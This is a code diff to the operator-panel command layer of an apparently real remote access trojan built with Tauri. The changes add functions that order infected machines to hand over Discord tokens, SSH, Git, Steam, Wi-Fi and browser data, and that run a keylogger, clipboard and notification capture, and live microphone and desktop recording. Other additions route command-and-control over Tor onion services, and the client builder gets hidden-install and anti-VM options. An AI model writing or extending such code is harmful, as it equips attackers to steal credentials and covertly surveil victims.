@@ -1,5 +1,11 @@
 import { invoke } from "@tauri-apps/api/core";
-import { RATClient, RATState, AssemblyInfo, TrollCommand } from "../../types";
+import {
+  RATClient,
+  RATState,
+  AssemblyInfo,
+  TrollCommand,
+  OnionServiceInfo,
+} from "../../types";
 
 export const startServerCmd = async (port: string): Promise<string> => {
   return invoke("start_server", { port });
@@ -23,7 +29,9 @@ export const buildClientCmd = async (
   installFileName: string,
   group: string,
   enableHidden: boolean,
-  antiVmDetection: boolean
+  antiVmDetection: boolean,
+  useTor: boolean,
+  torAddress: string
 ): Promise<void> => {
   return invoke("build_client", {
     ip,
@@ -40,6 +48,8 @@ export const buildClientCmd = async (
     group,
     enableHidden,
     antiVmDetection,
+    useTor,
+    torAddress,
   });
 };
 
@@ -224,6 +234,125 @@ export const stopRemoteDesktopCmd = async (
   return invoke("stop_remote_desktop", { addr });
 };
 
+export const startRemoteDesktopAudioCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("start_remote_desktop_audio", { addr });
+};
+
+export const stopRemoteDesktopAudioCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("stop_remote_desktop_audio", { addr });
+};
+
+export const requestMicDevicesCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("request_mic_devices", { addr });
+};
+
+export const requestDiscordTokensCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("request_discord_tokens", { addr });
+};
+
+export const requestWifiDataCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("request_wifi_data", { addr });
+};
+
+export const requestSoftwareInventoryCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("request_software_inventory", { addr });
+};
+
+export const requestGitDataCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("request_git_data", { addr });
+};
+
+export const requestSSHDataCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("request_ssh_data", { addr });
+};
+
+export const requestSteamDataCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("request_steam_data", { addr });
+};
+
+export const startClipboardMonitorCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("start_clipboard_monitor", { addr });
+};
+
+export const stopClipboardMonitorCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("stop_clipboard_monitor", { addr });
+};
+
+export const startNotificationCaptureCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("start_notification_capture", { addr });
+};
+
+export const stopNotificationCaptureCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("stop_notification_capture", { addr });
+};
+
+export const startMicLiveCmd = async (
+  addr: string | undefined,
+  deviceId: string
+): Promise<void> => {
+  return invoke("start_mic_live", { addr, deviceId });
+};
+
+export const stopMicLiveCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("stop_mic_live", { addr });
+};
+
+export const startMicRecordingCmd = async (
+  addr: string | undefined,
+  deviceId: string
+): Promise<void> => {
+  return invoke("start_mic_recording", { addr, deviceId });
+};
+
+export const stopMicRecordingCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("stop_mic_recording", { addr });
+};
+
+export const startDesktopRecordingCmd = async (
+  addr: string | undefined,
+  display: number,
+  quality: number,
+  fps: number
+): Promise<void> => {
+  return invoke("start_desktop_recording", { addr, display, quality, fps });
+};
+
+export const stopDesktopRecordingCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("stop_desktop_recording", { addr });
+};
+
 export const sendKeyboardInputCmd = async (
   addr: string | undefined,
   keyCode: number,
@@ -271,6 +400,18 @@ export const manageHVNC = async (
   return invoke("manage_hvnc", { addr, run });
 };
 
+export const startHVNCFrameAudioCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("start_hvnc_audio", { addr });
+};
+
+export const stopHVNCFrameAudioCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("stop_hvnc_audio", { addr });
+};
+
 export const uploadAndExecute = async (
   addr: string | undefined,
   filePath: string
@@ -283,6 +424,32 @@ export const executeFile = async (
   filePath: string
 ): Promise<void> => {
   return invoke("execute_file", { addr, filePath });
+};
+
+export const initTorCmd = async (): Promise<OnionServiceInfo[]> => {
+  return invoke("init_tor");
+};
+
+export const createOnionCmd = async (
+  nickname: string,
+  port: number
+): Promise<OnionServiceInfo> => {
+  return invoke("create_onion", { nickname, port });
+};
+
+export const deleteOnionCmd = async (nickname: string): Promise<void> => {
+  return invoke("delete_onion", { nickname });
+};
+
+/**
+ * Probe whether an onion service is actually reachable on the Tor network.
+ * Returns round-trip latency in milliseconds on success, throws on failure.
+ */
+export const checkOnionReachabilityCmd = async (
+  onionAddress: string,
+  port: number
+): Promise<number> => {
+  return invoke("check_onion_reachability", { onionAddress, port });
 };
 
 export const sendTrollCommand = async (
@@ -302,4 +469,41 @@ export const sendTrollCommand = async (
     addr,
     command: cleanCommand,
   });
+};
+
+export const startKeyloggerCmd = async (
+  addr: string | undefined,
+  realtime: boolean
+): Promise<void> => {
+  return invoke("start_keylogger", { addr, realtime });
+};
+
+export const stopKeyloggerCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("stop_keylogger", { addr });
+};
+
+export const getOfflineLogsCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("get_offline_logs", { addr });
+};
+
+export const clearOfflineLogsCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("clear_offline_logs", { addr });
+};
+
+export const getBrowserDataCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("get_browser_data", { addr });
+};
+
+export const setAutoUploadAnonFilesCmd = async (
+  enabled: boolean
+): Promise<void> => {
+  return invoke("set_auto_upload_anonfiles", { enabled });
 };
